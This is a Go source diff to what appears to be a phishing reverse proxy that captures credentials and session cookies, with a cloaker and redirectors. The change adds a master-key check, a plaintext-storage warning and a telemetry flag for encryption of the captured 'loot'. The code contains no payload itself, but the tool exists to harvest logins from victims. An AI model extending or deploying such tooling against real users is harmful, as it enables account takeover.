@@ -13,6 +13,7 @@ import (
 	"time"
 
 	"github.com/caddyserver/certmagic"
+	"github.com/s4l1hs/olta/pkg/campaign/secrets"
 	feedclient "github.com/s4l1hs/olta/pkg/feed/client"
 	"github.com/s4l1hs/olta/pkg/proxy/campaignstore"
 	"github.com/s4l1hs/olta/pkg/proxy/core"
@@ -100,6 +101,12 @@ type startupTelemetryConfig struct {
 	SessionValidatorEnabled bool
 	FeedEnabled             bool
 
+	// SecretsEncryptionEnabled reports whether OLTA_MASTER_KEY was
+	// configured, i.e. whether captured credentials and session tokens are
+	// encrypted at rest for this engagement. It is a posture boolean, never
+	// the key itself.
+	SecretsEncryptionEnabled bool
+
 	// Turnstile, WebhookURL, CampaignDBDriver, and CampaignDBTLSCA hold the
 	// raw flag values that can carry a secret, on purpose: -turnstile is a
 	// "public:private" key pair, -webhook-url is itself a bearer secret
@@ -155,6 +162,7 @@ func buildStartupEvent(cfg startupTelemetryConfig) telemetry.Event {
 		WithDetail("js_inspect_endpoint", cfg.JSInspectEndpoint).
 		WithDetail("session_validator_enabled", cfg.SessionValidatorEnabled).
 		WithDetail("feed_enabled", cfg.FeedEnabled).
+		WithDetail("secrets_encryption_enabled", cfg.SecretsEncryptionEnabled).
 		// Presence/enum only below -- never the secret value itself.
 		WithDetail("turnstile_enabled", cfg.Turnstile != "").
 		WithDetail("webhook_configured", strings.TrimSpace(cfg.WebhookURL) != "").
@@ -266,6 +274,28 @@ func main() {
 		return
 	}
 	cfg.SetRedirectorsDir(*redirectors_dir)
+
+	// Load the master key here, before anything opens a store, so the
+	// operator learns the encryption posture once at startup rather than
+	// never. database.NewDatabase and campaignstore.New both call
+	// ConfigureFromEnvironment themselves -- reading the same environment
+	// variable, so this is idempotent and they stay self-sufficient as
+	// libraries -- but both discard the "is encryption on" result, and the
+	// proxy is the process that writes the highest-value material there is:
+	// captured cookie auth tokens and credentials. Without this, an
+	// operator who forgot OLTA_MASTER_KEY gets a proxy that silently stores
+	// that material as plaintext, with nothing on screen to say so. The
+	// campaign service has warned about exactly this since its own Setup
+	// (see pkg/campaign/models.Setup); this closes the same gap on the side
+	// that holds the loot.
+	secretsEncryptionEnabled, err := secrets.ConfigureFromEnvironment()
+	if err != nil {
+		log.Fatal("master key: %v", err)
+		return
+	}
+	if !secretsEncryptionEnabled {
+		log.Warning("%s is not configured; captured credentials and session tokens will be stored as plaintext at rest", secrets.MasterKeyEnvironment)
+	}
 
 	db, err := database.NewDatabase(filepath.Join(*cfg_dir, "data.db"))
 	if err != nil {
@@ -490,25 +520,26 @@ func main() {
 	// buildStartupEvent for why turnstile, webhook-url, and the campaign DB
 	// value never appear in it.
 	telemetryBus.Emit(buildStartupEvent(startupTelemetryConfig{
-		Version:                 core.VERSION,
-		DeveloperMode:           *developer_mode,
-		ProxyHeaderTrustEnabled: *cloaker_trust_proxy_headers,
-		ClientProfile:           *client_profile,
-		RateLimitMax:            *rate_limit,
-		RateLimitWindow:         *rate_window,
-		CloakerEnabled:          *enable_cloaker,
-		CloakerAction:           strings.ToLower(*cloaker_action),
-		CloakerBlockStatus:      *cloaker_block_status,
-		IPSyncEnabled:           *enable_ip_sync,
-		IPSyncInterval:          *ip_sync_interval,
-		JSInspectEnabled:        *enable_js_inspect,
-		JSInspectEndpoint:       *js_inspect_endpoint,
-		SessionValidatorEnabled: *enable_session_validator,
-		FeedEnabled:             *feed_enabled,
-		Turnstile:               *turnstile,
-		WebhookURL:              *webhook_url,
-		CampaignDBDriver:        *campaign_db_driver,
-		CampaignDBTLSCA:         *campaign_db_tls_ca,
+		Version:                  core.VERSION,
+		DeveloperMode:            *developer_mode,
+		ProxyHeaderTrustEnabled:  *cloaker_trust_proxy_headers,
+		ClientProfile:            *client_profile,
+		RateLimitMax:             *rate_limit,
+		RateLimitWindow:          *rate_window,
+		CloakerEnabled:           *enable_cloaker,
+		CloakerAction:            strings.ToLower(*cloaker_action),
+		CloakerBlockStatus:       *cloaker_block_status,
+		IPSyncEnabled:            *enable_ip_sync,
+		IPSyncInterval:           *ip_sync_interval,
+		JSInspectEnabled:         *enable_js_inspect,
+		JSInspectEndpoint:        *js_inspect_endpoint,
+		SessionValidatorEnabled:  *enable_session_validator,
+		FeedEnabled:              *feed_enabled,
+		SecretsEncryptionEnabled: secretsEncryptionEnabled,
+		Turnstile:                *turnstile,
+		WebhookURL:               *webhook_url,
+		CampaignDBDriver:         *campaign_db_driver,
+		CampaignDBTLSCA:          *campaign_db_tls_ca,
 	}))
 
 	hp.Start()
